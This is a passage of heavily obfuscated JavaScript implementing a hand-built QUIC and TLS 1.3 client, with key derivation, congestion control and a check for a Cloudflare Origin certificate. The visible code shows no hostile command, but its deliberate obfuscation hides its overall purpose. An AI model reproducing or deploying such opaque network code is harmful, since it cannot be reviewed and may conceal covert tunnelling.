            }, b = Buffer[ia(0x8c2)](this[ia(0x58e)], a[ia(0x6ee)]), c = new a0bt()[ia(0x3c7)](a[ia(0xa9b)](b[ia(0xed)], 0x3))[ia(0x4a0)](0x0)[ia(0x3c7)](b[ia(0xed)])[ia(0x717)](b)[ia(0x14c)](), d = new a0bt()[ia(0x3c7)](0x4)[ia(0x3c7)](0x1d)['u16'](0x17)['build'](), f = new a0bt()['u16'](0x8)[ia(0x3c7)](0x403)[ia(0x3c7)](0x804)[ia(0x3c7)](0x401)[ia(0x3c7)](0x807)[ia(0x14c)](), g = new a0bt()[ia(0x4a0)](0x2)[ia(0x3c7)](0x304)[ia(0x14c)](), h = new a0bt()[ia(0x3c7)](0x4 + this[ia(0xc7d)][ia(0xed)])[ia(0x3c7)](0x1d)['u16'](this[ia(0xc7d)][ia(0xed)])[ia(0x717)](this[ia(0xc7d)])[ia(0x14c)](), i = Buffer['concat']([
                Buffer[ia(0x8c2)]([this['alpn'][ia(0xed)]]),
                Buffer[ia(0x8c2)](this[ia(0x71b)], a[ia(0x6ee)])
            ]), j = new a0bt()[ia(0x3c7)](i[ia(0xed)])[ia(0x717)](i)[ia(0x14c)](), k = new a0bt()[ia(0x4a0)](0x1)[ia(0x4a0)](0x1)[ia(0x14c)](), l = Buffer[ia(0x653)]([
                a[ia(0x17d)](a0bN, 0x0, c),
                a['wFOEH'](a0bN, 0xa, d),
                a['tsOeL'](a0bN, 0xd, f),
                a[ia(0x17d)](a0bN, 0x2b, g),
                a[ia(0x305)](a0bN, 0x33, h),
                a[ia(0x17d)](a0bN, 0x10, j),
                a[ia(0x17d)](a0bN, 0x2d, k),
                a[ia(0x305)](a0bN, 0xff01, Buffer[ia(0x8c2)]([0x0])),
                a[ia(0x305)](a0bN, 0x39, this[ia(0xd5e)])
            ]), m = Buffer[ia(0x8c2)]([
                0x0,
                0x4,
                0x13,
                0x1,
                0x13,
                0x2
            ]), n = Buffer[ia(0x653)]([
                Buffer[ia(0x8c2)]([
                    0x3,
                    0x3
                ]),
                a0k[ia(0x863)](0x20),
                Buffer[ia(0x8c2)]([0x0]),
                m,
                Buffer['from']([
                    0x1,
                    0x0
                ]),
                Buffer[ia(0x8c2)]([
                    a[ia(0x76e)](a[ia(0x2a4)](l[ia(0xed)], 0x8), 0xff),
                    a[ia(0x167)](l[ia(0xed)], 0xff)
                ]),
                l
            ]), o = a[ia(0x17d)](a0bM, 0x1, n);
        return this[ia(0x6df)]['push'](o), this[ia(0x22b)] = a[ia(0x6a6)], o;
    }
    ['serverHelloComplete'](a) {
        const ib = a0ch, b = {
                'muNsT': function (d, f) {
                    return d < f;
                },
                'YIVfU': function (d, f) {
                    return d !== f;
                },
                'pOsHa': ib(0xbcd),
                'Ifnlm': function (d, f) {
                    return d + f;
                },
                'MYlTk': function (d, f) {
                    return d + f;
                }
            };
        if (b[ib(0x7ab)](a[ib(0xed)], 0x4))
            return null;
        if (b[ib(0xd2c)](a[0x0], 0x2))
            throw new Error(b[ib(0x1e2)]);
        const c = a[ib(0x21d)](0x1, 0x3);
        if (a[ib(0xed)] < b[ib(0x223)](0x4, c))
            return null;
        return a[ib(0x4b4)](0x0, b[ib(0x75c)](0x4, c));
    }
    ['handleServerHello'](a) {
        const ic = a0ch, b = {
                'ROKHb': function (q, r) {
                    return q < r;
                },
                'vwVNu': function (q, r) {
                    return q >= r;
                },
                'REJUc': function (q, r) {
                    return q === r;
                },
                'rbrKo': function (q, r) {
                    return q >= r;
                },
                'XkNdR': function (q, r) {
                    return q !== r;
                },
                'XbDyZ': function (q, r) {
                    return q + r;
                },
                'hNxeY': ic(0xb11),
                'zFjBE': 'sha384',
                'RUMRf': 'aes-256-gcm',
                'cHFvt': function (q, r) {
                    return q + r;
                },
                'qWWls': ic(0xd31),
                'VUiIW': ic(0x26f),
                'eUhFw': ic(0x6cc),
                'CafSM': ic(0x96c),
                'coZbO': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'HrhsF': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'xHYoV': ic(0x7cd),
                'sUnan': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'fXgvR': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'cDdKg': 'c\x20hs\x20traffic',
                'USghy': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'aQQsa': ic(0x5e0)
            }, c = new a0bu(a[ic(0x4b4)](0x4));
        c['u16']();
        const d = c[ic(0x717)](0x20);
        if (d[ic(0x45b)](a0bf))
            throw new Error('edge\x20requested\x20a\x20HelloRetryRequest,\x20which\x20is\x20not\x20supported');
        const f = c[ic(0x717)](c[ic(0x4a0)]()), g = c[ic(0x3c7)]();
        c['byte']();
        let h = null;
        const i = c['u16']();
        let j = 0x0;
        while (b[ic(0xb0d)](j, i) && b[ic(0x388)](c[ic(0x7b4)], 0x4)) {
            const q = c[ic(0x3c7)](), r = c[ic(0x3c7)](), s = c[ic(0x717)](r);
            j += 0x1;
            if (b[ic(0xc5c)](q, 0x33) && s['length'] >= 0x4) {
                const t = new a0bu(s), u = t[ic(0x3c7)](), v = t[ic(0x3c7)]();
                h = {
                    'group': u,
                    'key': t[ic(0x717)](v)
                };
            } else {
                if (b[ic(0xc5c)](q, 0x2b) && b[ic(0x45f)](s[ic(0xed)], 0x2)) {
                    if (b['XkNdR'](s['readUInt16BE'](0x0), 0x304))
                        throw new Error(ic(0x618));
                }
            }
        }
        if (b[ic(0xc5c)](h, null))
            throw new Error(ic(0x4e3));
        if (h[ic(0xa77)] !== 0x1d)
            throw new Error(b[ic(0xd4a)](ic(0x4c0), h['group']));
        if (b[ic(0xc5c)](g, 0x1301))
            this[ic(0x977)] = b['hNxeY'], this[ic(0x9c9)] = 0x20, this[ic(0x2fa)] = ic(0x255);
        else {
            if (b['REJUc'](g, 0x1302))
                this['hash'] = b['zFjBE'], this[ic(0x9c9)] = 0x30, this[ic(0x2fa)] = b[ic(0x51a)];
            else
                throw new Error(b[ic(0x3a5)](b[ic(0x8cd)], g[ic(0x1d9)](0x10)));
        }
        this['messages']['push'](a);
        const k = a0k[ic(0x915)]({
                'key': Buffer['concat']([
                    Buffer['from']('302a300506032b656e032100', b[ic(0x7ea)]),
                    h['key']
                ]),
                'format': b[ic(0x8b7)],
                'type': b[ic(0x815)]
            }), l = a0k[ic(0xd19)]({
                'privateKey': this['keyPair'][ic(0xc79)],
                'publicKey': k
            }), m = Buffer[ic(0x9e7)](this['hashLength']), n = b[ic(0x5c2)](a0bv, this[ic(0x977)], m, m), o = b['HrhsF'](a0bx, this['hash'], n, b[ic(0xc0b)], a0k['createHash'](this[ic(0x977)])[ic(0x248)](), this[ic(0x9c9)]);
        this[ic(0x83a)] = b[ic(0xc3c)](a0bv, this[ic(0x977)], o, l);
        const p = this[ic(0x57c)]();
        return this[ic(0xd67)] = b[ic(0x6f1)](a0bx, this[ic(0x977)], this[ic(0x83a)], b[ic(0x8b0)], p, this['hashLength']), this['serverHandshakeSecret'] = b[ic(0x351)](a0bx, this[ic(0x977)], this[ic(0x83a)], ic(0x4ff), p, this['hashLength']), this[ic(0x22b)] = b[ic(0x10e)], {
            'send': new a0by(this['hash'], this[ic(0x2fa)], this[ic(0xd67)]),
            'recv': new a0by(this[ic(0x977)], this[ic(0x2fa)], this['serverHandshakeSecret'])
        };
    }
    [a0ch(0x635)](a) {
        const id = a0ch, b = {
                'fXIHf': function (u, v) {
                    return u === v;
                },
                'kzpWC': function (u, v) {
                    return u < v;
                },
                'JVmXH': function (u, v) {
                    return u >= v;
                },
                'AXKBo': function (u, v) {
                    return u === v;
                },
                'kPgaR': function (u, v) {
                    return u(v);
                },
                'PGnSI': function (u, v) {
                    return u === v;
                },
                'JiuzS': function (u, v) {
                    return u >= v;
                },
                'IwUjc': function (u, v) {
                    return u + v;
                },
                'sdXsV': function (u, v) {
                    return u + v;
                },
                'uaKwG': function (u, v) {
                    return u > v;
                },
                'vscHN': function (u, v) {
                    return u <= v;
                },
                'yXLQR': function (u, v) {
                    return u + v;
                },
                'tWzDg': function (u, v) {
                    return u + v;
                },
                'NONgC': function (u, v) {
                    return u + v;
                },
                'OGGge': function (u, v) {
                    return u - v;
                },
                'gxFGO': function (u, v) {
                    return u - v;
                },
                'NdlOe': id(0x5df),
                'qenvf': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'vHRrp': function (u, v, w) {
                    return u(v, w);
                },
                'KTMRS': id(0x7cd),
                'REQvU': function (u, v, w, x) {
                    return u(v, w, x);
                },
                'FZdPi': id(0x129),
                'qXMcB': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'hepdP': id(0x99e),
                'trAld': 'complete'
            };
        this[id(0x6df)][id(0x77f)](a);
        const c = a[0x0];
        if (b[id(0x403)](c, 0x8)) {
            const u = new a0bu(a['subarray'](0x4)), v = u[id(0x3c7)]();
            let w = 0x0;
            while (b[id(0x2ca)](w, v) && b[id(0x3bb)](u[id(0x7b4)], 0x4)) {
                const x = u[id(0x3c7)](), y = u[id(0x3c7)](), z = u[id(0x717)](y);
                w += 0x1;
                if (b['AXKBo'](x, 0x39))
                    this[id(0xa0d)] = b[id(0x792)](a0bK, Buffer['from'](z));
                else
                    b['PGnSI'](x, 0x10) && b[id(0x3bb)](z['length'], 0x3) && (this[id(0x3c9)] = z['subarray'](0x3)[id(0x1d9)](id(0xc74)));
            }
            return null;
        }
        if (c === 0xb) {
            const A = a[id(0x4b4)](0x4);
            if (b[id(0x7a0)](A['length'], 0x4)) {
                const B = b[id(0x578)](0x1, A[0x0]);
                if (b[id(0x578)](B, 0x3) <= A[id(0xed)]) {
                    const C = A[id(0x21d)](B, 0x3);
                    if (b[id(0x961)](B + 0x3, C) <= A['length'] && b[id(0x3bb)](C, 0x3)) {
                        const D = A[id(0x21d)](b['sdXsV'](B, 0x3), 0x3);
                        b['uaKwG'](D, 0x0) && b[id(0xaa4)](b[id(0x578)](b['yXLQR'](B, 0x6), D), A[id(0xed)]) && (this['leafCert'] = Buffer[id(0x8c2)](A[id(0x4b4)](b['sdXsV'](B, 0x6), b[id(0xad1)](b[id(0x7f5)](B, 0x6), D))));
                    }
                }
            }
            return null;
        }
        if (b[id(0x318)](c, 0xf) || c === 0x4)
            return null;
        if (c !== 0x14)
            return null;
        const d = this[id(0x6df)][b['OGGge'](this[id(0x6df)]['length'], 0x1)], f = d[id(0x4b4)](0x4), g = this[id(0x57c)](b[id(0xb20)](this[id(0x6df)][id(0xed)], 0x1)), h = a0bx(this[id(0x977)], this[id(0x152)], b['NdlOe'], Buffer[id(0x9e7)](0x0), this[id(0x9c9)]), i = a0k[id(0xa37)](this[id(0x977)], h)[id(0xd44)](g)['digest'](), j = b[id(0x403)](i['length'], f[id(0xed)]) && a0k[id(0x619)](i, f), k = b[id(0x271)](a0bx, this[id(0x977)], this[id(0xd67)], b[id(0x787)], Buffer[id(0x9e7)](0x0), this['hashLength']), l = this[id(0x57c)](), m = a0k[id(0xa37)](this[id(0x977)], k)[id(0xd44)](l)['digest'](), n = b[id(0x284)](a0bM, 0x14, m), o = Buffer[id(0x9e7)](this[id(0x9c9)]), p = a0bx(this[id(0x977)], this[id(0x83a)], b['KTMRS'], a0k[id(0xaf4)](this['hash'])[id(0x248)](), this[id(0x9c9)]), q = b[id(0x3b7)](a0bv, this[id(0x977)], p, o), r = this['transcript']();
        this['messages'][id(0x77f)](n);
        const s = b[id(0x271)](a0bx, this[id(0x977)], q, b[id(0xcb0)], r, this[id(0x9c9)]), t = b[id(0x7ec)](a0bx, this[id(0x977)], q, b[id(0x320)], r, this[id(0x9c9)]);
        return this[id(0x22b)] = b[id(0x633)], {
            'verified': j,
            'finished': n,
            'send': new a0by(this[id(0x977)], this[id(0x2fa)], s),
            'recv': new a0by(this[id(0x977)], this[id(0x2fa)], t)
        };
    }
}
function a0bP(a) {
    const ie = a0ch, b = {
            'KYZbR': ie(0xb7f),
            'VbCjC': function (k, l) {
                return k === l;
            },
            'wUaHJ': ie(0x5d8),
            'IqXlE': function (k, l) {
                return k + l;
            },
            'wyjMo': function (k, l) {
                return k(l);
            },
            'LVvfs': ie(0x262),
            'pwBBl': 'CN=CloudFlare\x20Origin\x20Certificate',
            'eJcBH': 'subject\x20CN\x20mismatch:\x20',
            'SMjYa': ie(0x211),
            'zcDbi': function (k, l) {
                return k + l;
            },
            'XoBvE': function (k, l) {
                return k + l;
            }
        };
    if (!a || !a[ie(0xed)])
        return ie(0x825);
    let c;
    try {
        c = new a0k['X509Certificate'](a);
    } catch (k) {
        return b['IqXlE'](ie(0x3b9), k['message']);
    }
    const d = l => String(l || '')['replace'](/\\,/g, ','), f = b[ie(0xbc7)](d, c['issuer']), g = d(c[ie(0x9e3)]);
    if (!f['includes'](b['LVvfs']))
        return b[ie(0xd0c)](ie(0x192), f);
    if (!f[ie(0x659)](ie(0x29b)))
        return 'issuer\x20OU\x20mismatch:\x20' + f;
    if (!g[ie(0x659)](b['pwBBl']))
        return b['IqXlE'](b[ie(0x615)], g);
    const h = b[ie(0xbc7)](String, c[ie(0x3d6)] || '')[ie(0xbb0)](',')['map'](l => l['trim']()[ie(0xacd)]()), i = b[ie(0xa55)], j = h[ie(0xb7b)](l => {
            const ig = ie;
            if (!l['startsWith'](b['KYZbR']))
                return ![];
            const m = l[ig(0x88a)](0x4);
            return b['VbCjC'](m, i) || b[ig(0xb22)](m, b[ig(0x338)]) || m[ig(0xc9b)]('*.') && i[ig(0x5d7)](m[ig(0x88a)](0x1));
        });
    if (!j)
        return b[ie(0x9c3)](b[ie(0xa9f)](ie(0xb74), b[ie(0xbc7)](String, c['subjectAltName'] || '')), ')');
    return null;
}
class a0bQ {
    constructor(a, b, c) {
        const ih = a0ch, d = { 'oybVF': ih(0xc28) }, f = d[ih(0x11e)][ih(0xbb0)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[ih(0x2e1)] = 0x0;
                continue;
            case '1':
                this[ih(0xb5f)] = c;
                continue;
            case '2':
                this[ih(0x731)] = 0x0;
                continue;
            case '3':
                this[ih(0xd42)] = null;
                continue;
            case '4':
                this[ih(0x2b8)] = ![];
                continue;
            case '5':
                this[ih(0x23d)] = Buffer[ih(0x9e7)](0x0);
                continue;
            case '6':
                this['peerLimit'] = 0x0;
                continue;
            case '7':
                this[ih(0x920)] = new a0bE();
                continue;
            case '8':
                this[ih(0x88b)] = a[ih(0x529)];
                continue;
            case '9':
                this[ih(0x6da)] = new a0bD(a);
                continue;
            case '10':
                this['id'] = b;
                continue;
            case '11':
                this['connection'] = a;
                continue;
            case '12':
                this[ih(0x84e)] = ![];
                continue;
            }
            break;
        }
    }
    ['write'](a, b) {
        const ii = a0ch;
        this[ii(0x6da)][ii(0x82b)](a, Boolean(b)), this[ii(0x205)][ii(0x971)](this);
    }
}
class a0bR {
    constructor(a) {
        const ij = a0ch, b = {
                'Xqwxm': function (c, d) {
                    return c === d;
                },
                'ahqce': function (c, d) {
                    return c << d;
                },
                'bhNVb': function (c, d) {
                    return c === d;
                },
                'sxMgh': function (c, d) {
                    return c << d;
                },
                'ssQeM': function (c, d) {
                    return c * d;
                }
            };
        this[ij(0x215)] = a['logger'], this[ij(0xab4)] = a[ij(0xab4)], this[ij(0xae3)] = a[ij(0xae3)], this[ij(0x58e)] = a['serverName'] || a['host'], this['alpn'] = a[ij(0x71b)] || a0bc, this[ij(0xd64)] = a[ij(0xd64)] || a0bi, this[ij(0x79b)] = b['Xqwxm'](a[ij(0x79b)], undefined) ? 0x7530 : a['idleTimeout'], this[ij(0x8c3)] = b[ij(0x1f2)](a[ij(0x8c3)], undefined) ? 0x3e8 : a['keepAlive'], this[ij(0xce4)] = a[ij(0xce4)] || 0x100, this[ij(0x99a)] = a[ij(0x99a)] || b[ij(0x7d3)](0x1, 0x16), this['localStreamData'] = a[ij(0x529)] || b[ij(0x7d3)](0x1, 0x14), this['verifyCertificate'] = b[ij(0x512)](a['verifyCertificate'], !![]), this['onReady'] = a[ij(0xa0b)] || function () {
        }, this[ij(0x7c5)] = a[ij(0x7c5)] || function () {
        }, this[ij(0x489)] = a[ij(0x489)] || function () {
        }, this[ij(0x216)] = a[ij(0x216)] || function () {
        }, this[ij(0x6fe)] = a['onClose'] || function () {
        }, this[ij(0x4bc)] = a0k[ij(0x863)](0x8), this[ij(0x458)] = a0k[ij(0x863)](0x8), this[ij(0x7fd)] = a['receiveWindow'] || 0x1 << 0x14, this['_stoppedFlag'] = ![], this[ij(0x46c)] = a0bL([
            [
                a0bp[ij(0x580)],
                this[ij(0x79b)]
            ],
            [
                a0bp[ij(0xc32)],
                this[ij(0x99a)]
            ],
            [
                a0bp[ij(0x6c2)],
                this[ij(0x529)]
            ],
            [
                a0bp[ij(0x795)],
                this[ij(0x529)]
            ],
            [
                a0bp['initialMaxStreamDataUni'],
                this[ij(0x529)]
            ],
            [
                a0bp[ij(0x41d)],
                0x1 << 0x18
            ],
            [
                a0bp[ij(0xd1a)],
                b['sxMgh'](0x1, 0x18)
            ],
            [
                a0bp[ij(0x7b7)],
                this[ij(0xd64)]
            ],
            [
                a0bp['activeConnectionIdLimit'],
                0x8
            ],
            [
                a0bp[ij(0xb26)],
                this[ij(0x4bc)]
            ]
        ]), this[ij(0x40a)] = new a0bO(this[ij(0x58e)], this[ij(0x71b)], this[ij(0x46c)]), this['socket'] = null, this[ij(0xb41)] = null, this[ij(0x1b6)] = ![], this[ij(0x46a)] = null, this[ij(0x2d7)] = null, this[ij(0x2a2)] = [
            null,
            null,
            null
        ], this[ij(0xb0b)] = [], this[ij(0x661)] = [
            null,
            null
        ], this[ij(0x688)] = 0x0, this['pnSend'] = [
            0x0,
            0x0,
            0x0
        ], this['largestRecv'] = [
            -0x1,
            -0x1,
            -0x1
        ], this[ij(0x967)] = [
            [],
            [],
            []
        ], this[ij(0x9c5)] = [
            ![],
            ![],
            ![]
        ], this[ij(0x13f)] = [
            [],
            [],
            []
        ], this[ij(0x7ff)] = [
            new a0bD(this),
            new a0bD(this),
            new a0bD(this)
        ], this[ij(0x2f5)] = [
            new a0bE(),
            new a0bE(),
            new a0bE()
        ], this[ij(0x158)] = Buffer['alloc'](0x0), this[ij(0xca2)] = Buffer[ij(0x9e7)](0x0), this['streams'] = new Map(), this[ij(0x1f6)] = [], this[ij(0xa47)] = 0x0, this['peerMaxData'] = 0x0, this[ij(0x41c)] = 0x0, this[ij(0x69b)] = 0x0, this['connectionSent'] = 0x0, this[ij(0x627)] = 0x0, this['creditMaxData'] = ![], this['creditReady'] = [], this[ij(0x240)] = [], this[ij(0x691)] = ![], this[ij(0xc92)] = ![], this[ij(0x992)] = ![], this['registered'] = ![], this[ij(0x554)] = ![], this[ij(0x912)] = 0xfa, this[ij(0x7f4)] = 0x0, this[ij(0xd3b)] = a[ij(0xd3b)] || 0xa * this['maxPacket'], this['minWindow'] = b[ij(0xa5c)](0x2, this[ij(0xd64)]), this[ij(0xc24)] = this['initialWindow'], this[ij(0xd4e)] = Infinity, this[ij(0x6ba)] = b[ij(0xa5c)](this['maxInflight'], this[ij(0xd64)]), this[ij(0x1c8)] = null, this[ij(0xc05)] = null, this[ij(0x806)] = 0x19, this['ptoCount'] = 0x0, this[ij(0xd07)] = 0x3, this[ij(0x78d)] = 0x0, this['lastEliciting'] = 0x0, this['pingPending'] = ![], this[ij(0x804)] = 0x0, this[ij(0x962)] = null, this[ij(0xd55)] = Buffer[ij(0x9e7)](0x0), this[ij(0xa0d)] = null, this[ij(0xca4)] = {
            'rx': 0x0,
            'tx': 0x0,
            'rxBytes': 0x0,
            'txBytes': 0x0,
            'dropped': 0x0,
            'retransmits': 0x0
        };
    }
    get [a0ch(0x727)]() {
        const ik = a0ch, a = {
                'xJitC': function (b, c) {
                    return b === c;
                }
            };
        return a[ik(0xa19)](this[ik(0xc14)], !![]);
    }
    set [a0ch(0x727)](a) {
        const il = a0ch;
        this['_stoppedFlag'] = a === !![], this[il(0xc14)] && !this['closed'] && !this[il(0x1b6)] && this[il(0x4f7)](il(0xb0c));
    }
    [a0ch(0x368)]() {
        const im = a0ch, a = {
                'NeBRb': function (b, c) {
                    return b + c;
                },
                'kNcEe': 'receive\x20failed:\x20',
                'ERsuB': function (b, c) {
                    return b + c;
                },
                'zCuQp': im(0x3aa),
                'IyRMT': im(0x1c4),
                'eLkbg': im(0x538),
                'BMBuy': im(0x8f9),
                'yVnoj': im(0xb89)
            };
        return new Promise((b, c) => {
            const io = im, d = a[io(0x7f9)][io(0xbb0)]('|');
            let f = 0x0;
            while (!![]) {
                switch (d[f++]) {
                case '0':
                    this[io(0xb6f)][io(0x6f7)](0x0, a[io(0x65b)], () => this[io(0x8a7)]());
                    continue;
                case '1':
                    this['settle'] = {
                        'resolve': b,
                        'reject': c
                    };
                    continue;
                case '2':
                    this[io(0xb6f)]['on'](a[io(0x2cc)], g => {
                        const ip = io;
                        try {
                            this[ip(0xac0)](g);
                        } catch (h) {
                            this['_fail'](a[ip(0x447)](a[ip(0xbe0)], h));
                        }
                    });
                    continue;
                case '3':
                    this[io(0xb6f)] = a0a3[io(0xd4d)](a[io(0x7de)]);
                    continue;
                case '4':
                    this[io(0xb6f)]['on'](io(0xb4f), g => {
                        const iq = io;
                        !this[iq(0xb41)] && this[iq(0xc49)](a['ERsuB'](a[iq(0x5c3)], g['message']));
                    });
                    continue;
                }
                break;
            }
        });
    }
    ['_start']() {
        const ir = a0ch, a = {
                'IAWQt': ir(0xaf6),
                'HIWmD': function (d, f) {
                    return d + f;
                },
                'HgXzy': function (d, f) {
                    return d + f;
                },
                'npAdV': function (d, f) {
                    return d + f;
                },
                'nXqSZ': function (d, f) {
                    return d + f;
                },
                'xgeiQ': function (d, f) {
                    return d + f;
                },
                'jHrrB': function (d, f) {
                    return d + f;
                },
                'WjZlH': ir(0x59a),
                'sWxnJ': ir(0xa3a),
                'DzFCo': ir(0x9dd),
                'STRVo': ir(0x26f)
            }, b = a[ir(0x7f1)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['lastEliciting'] = Date[ir(0x156)]();
                continue;
            case '1':
                this[ir(0x57f)]();
                continue;
            case '2':
                this['log'][ir(0x4f6)](a[ir(0x5a5)](a[ir(0xbe5)](a[ir(0xbd3)](a[ir(0x640)](a['xgeiQ'](a['jHrrB'](a[ir(0xbd3)](a[ir(0xcd3)], this[ir(0xab4)]), ':'), this[ir(0xae3)]), a[ir(0x9d7)]), this[ir(0x71b)]), a[ir(0x331)]), this[ir(0x458)][ir(0x1d9)](a['STRVo'])));
                continue;
            case '3':
                this[ir(0x962)] = setInterval(() => this[ir(0x57f)](), 0x14);
                continue;
            case '4':
                this[ir(0x7ff)][a0bk][ir(0x82b)](this[ir(0x40a)][ir(0x1f5)](), ![]);
                continue;
            case '5':
                this[ir(0x78d)] = Date[ir(0x156)]();
                continue;
            case '6':
                this['keys'][a0bk] = a0bA(this[ir(0x458)], !![]);
                continue;
            }
            break;
        }
    }
    [a0ch(0x57f)]() {
        const is = a0ch, a = {
                'GCtQp': function (d, f) {
                    return d >= f;
                },
                'dyiXL': function (d, f) {
                    return d < f;
                },
                'XkZQS': function (d, f) {
                    return d < f;
                },
                'mPaRL': function (d, f) {
                    return d === f;
                },
                'tYcKy': function (d, f) {
                    return d - f;
                },
                'wrnLO': function (d, f) {
                    return d + f;
                },
                'jMlqo': function (d, f) {
                    return d + f;
                },
                'Zodht': 'peer\x20idle\x20for\x20'
            };
        if (this['closed'])
            return;
        const b = Date[is(0x156)]();
        this[is(0x4e8)](b);
        this[is(0x8c3)] && this[is(0x691)] && a[is(0x844)](b - this[is(0x362)], this[is(0x8c3)]) && (this[is(0xb68)] = !![]);
        let c = 0x0;
        while (c < 0x10 && a[is(0xc85)](this[is(0x96f)](), this[is(0xce4)]) && (a[is(0x3d3)](this[is(0x230)](), this[is(0xbab)]()) || this[is(0x9db)]() || this[is(0x1b6)])) {
            const d = this['_buildPacket']();
            if (a[is(0x1b5)](d, null))
                break;
            this[is(0x20c)](d), c += 0x1;
        }
        a[is(0xb40)](b, this[is(0x78d)]) > Math[is(0x434)](this[is(0x79b)], 0x3a98) && this[is(0xc49)](a[is(0x2d4)](a[is(0x1f1)](a['Zodht'], a[is(0xb40)](b, this[is(0x78d)])), 'ms'));
    }
    [a0ch(0x96f)]() {
        const it = a0ch, a = {
                'nyHYQ': function (b, c) {
                    return b + c;
                }
            };
        return a[it(0x3d1)](this['inFlight'][0x0][it(0xed)], this[it(0x13f)][0x1][it(0xed)]) + this['inFlight'][0x2]['length'];
    }
    [a0ch(0x9db)]() {
        const iu = a0ch, a = {
                'UjVzl': function (b, c) {
                    return b < c;
                },
                'EihDO': function (b, c) {
                    return b !== c;
                }
            };
        for (let b = 0x0; a[iu(0x3e2)](b, 0x3); b++) {
            if (a[iu(0x7c2)](this[iu(0x2a2)][b], null) && this['ackPending'][b] && this[iu(0x967)][b]['length'])
                return !![];
        }
        return ![];
    }
    [a0ch(0x230)]() {
        const iv = a0ch, a = {
                'tZiRw': function (c, d) {
                    return c < d;
                }
            };
        let b = 0x0;
        for (let c = 0x0; a[iv(0x779)](c, 0x3); c++) {
            for (const d of this['inFlight'][c]) {
                b += d[iv(0x717)];
            }
        }
        return b;
    }
    [a0ch(0xbab)]() {
        const iw = a0ch;
        return this[iw(0x691)] ? this[iw(0xc24)] : Infinity;
    }
    [a0ch(0xa04)]() {
        const ix = a0ch, a = {
                'CjZNx': function (b, c) {
                    return b * c;
                }
            };
        return Math[ix(0x434)](a[ix(0x5b2)](this[ix(0x912)], Math[ix(0x584)](0x2, this[ix(0x1f7)])), 0x14);
    }
    [a0ch(0xb2c)](a) {
        const iy = a0ch, b = {
                'eKxPF': function (c, d) {
                    return c === d;
                },
                'yaxPo': function (c, d) {
                    return c / d;
                },
                'GjuzK': function (c, d) {
                    return c / d;
                },
                'LSOhp': function (c, d) {
                    return c * d;
                },
                'GGHTA': function (c, d) {
                    return c - d;
                },
                'MtMsY': function (c, d) {
                    return c / d;
                },
                'dvqCo': function (c, d) {
                    return c + d;
                },
                'VJLfS': function (c, d) {
                    return c * d;
                },
                'VtUHS': function (c, d) {
                    return c + d;
                }
            };
        b[iy(0x6b7)](this[iy(0x1c8)], null) ? (this['srtt'] = a, this[iy(0xc05)] = b[iy(0x40f)](a, 0x2)) : (this[iy(0xc05)] = b[iy(0x69a)](b['LSOhp'](this[iy(0xc05)], 0x3) + Math['abs'](b['GGHTA'](this[iy(0x1c8)], a)), 0x4), this[iy(0x1c8)] = b['MtMsY'](b[iy(0xbdf)](b['VJLfS'](this[iy(0x1c8)], 0x7), a), 0x8)), this[iy(0x912)] = Math[iy(0x23a)](b['VtUHS'](this['srtt'], b[iy(0xbd8)](0x4, this[iy(0xc05)])) + this[iy(0x806)]);
    }
    [a0ch(0xc03)](a) {
        const iz = a0ch, b = {
                'wTkTn': function (c, d) {
                    return c / d;
                },
                'NuTuy': function (c, d) {
                    return c + d;
                },
                'xMokq': function (c, d) {
                    return c + d;
                },
                'grSVV': 'quic\x20loss\x20epoch=',
                'bfscE': '\x20cwnd=',
                'ZdyFN': iz(0x226),
                'rvBuR': function (c, d) {
                    return c === d;
                }
            };
        this[iz(0xd4e)] = Math['max'](Math[iz(0x579)](b['wTkTn'](this['congestionWindow'], 0x2)), 0x2 * this['minWindow']), this[iz(0xc24)] = this[iz(0xa57)], this[iz(0x215)][iz(0x4f6)](b[iz(0x369)](b[iz(0x369)](b['NuTuy'](b[iz(0x50d)](b['NuTuy'](b[iz(0x78e)], a0bn[a]) + b[iz(0xd6d)] + this[iz(0xc24)], '\x20ssthresh='), this[iz(0xd4e)]), b[iz(0xc7c)]), b[iz(0xc5d)](this[iz(0x1c8)], null) ? '-' : Math[iz(0x23a)](this[iz(0x1c8)])) + 'ms');
    }
    [a0ch(0x4e8)](a) {
        const iA = a0ch, b = {
                'LoyyA': function (c, d) {
                    return c < d;
                },
                'piykN': function (c, d) {
                    return c - d;
                },
                'udZCv': function (c, d) {
                    return c + d;
                },
                'hAmkH': function (c, d) {
                    return c + d;
                },
                'UaASi': function (c, d) {
                    return c + d;
                },
                'mWBRZ': function (c, d) {
                    return c + d;
                },
                'CrYZU': function (c, d) {
                    return c + d;
                },
                'KystK': iA(0x3e9),
                'VbWgM': iA(0x735),
                'JUKRi': '\x20pending=',
                'oHqPk': iA(0xa33),
                'uWbcr': function (c, d) {
                    return c > d;
                },
                'spVVW': iA(0x4c2)
            };
        for (let c = 0x0; c < 0x3; c++) {
            const d = this[iA(0x13f)][c];
            if (!d[iA(0xed)])
                continue;
            if (b[iA(0x884)](b[iA(0x304)](a, d[0x0]['time']), this['_ptoDuration']()))
                continue;
            const f = d[0x0];
            this[iA(0x13f)][c] = d['slice'](0x1), this[iA(0x417)](c, f), this['retransmits'] += 0x1, this[iA(0xca4)][iA(0x7f4)] += 0x1, this[iA(0x1f7)] += 0x1, this['log']['debug'](b[iA(0x877)](b[iA(0x877)](b[iA(0x9c1)](b[iA(0x432)](b[iA(0xbd7)](b['CrYZU'](b['KystK'], a0bn[c]), b[iA(0x3ac)]), f['pn']), b[iA(0xaf1)]) + this[iA(0x13f)][c][iA(0xed)], b['oHqPk']), this[iA(0xa04)]()));
            if (b['uWbcr'](this['retransmits'], 0x18)) {
                this['_fail'](b['CrYZU'](b['CrYZU'](iA(0x360), this[iA(0x7f4)]), b[iA(0x23b)]));
                return;
            }
        }
    }
    [a0ch(0x417)](a, b) {
        const iB = a0ch;
        b['crypto'] && this['cryptoSend'][a][iB(0x67e)]([b['crypto']]);
        for (const c of b[iB(0x4b0)]) {
